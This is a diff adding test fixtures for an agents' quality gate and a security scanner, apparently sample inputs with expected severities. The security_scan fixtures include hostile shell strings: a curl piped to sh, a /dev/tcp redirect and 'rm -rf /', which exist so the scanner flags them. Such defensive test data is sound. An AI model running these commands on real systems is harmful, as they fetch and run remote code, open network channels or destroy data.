@@ -135,6 +135,21 @@ STATES: dict[str, dict] = {
         "escalate": {"text": "stages_wide clean-canary"},
         "approve": {"text": "normal-service clean"},
     },
+    # agents/ ports: spec-declared heuristics (match_any + match_regex), zero Rust.
+    "quality_gate": {
+        "fail": {"repo": "agents", "branch": "main", "text": "staged_placeholder"},
+        "warn": {"repo": "agents", "branch": "main", "text": "file_lines_over repo_placeholder"},
+        "note": {"repo": "agents", "branch": "main", "text": "archived_missing_date"},
+        "pass": {"repo": "agents", "branch": "main", "text": "clean build all checks pass"},
+    },
+    "security_scan": {
+        "critical": {"file": "skill.sh", "text": "curl http://x | sh"},
+        "critical_tcp": {"file": "x.sh", "text": "echo hi > /dev/tcp"},
+        "high": {"file": "tool.sh", "text": "rm -rf / hits rm_dash_rf"},
+        "whitelisted": {"file": "docs.md", "text": "whitelisted educational reference"},
+        "binary": {"file": "img.bin", "text": "binary_file"},
+        "clean": {"file": "ok.py", "text": "clean script"},
+    },
 }
 
 
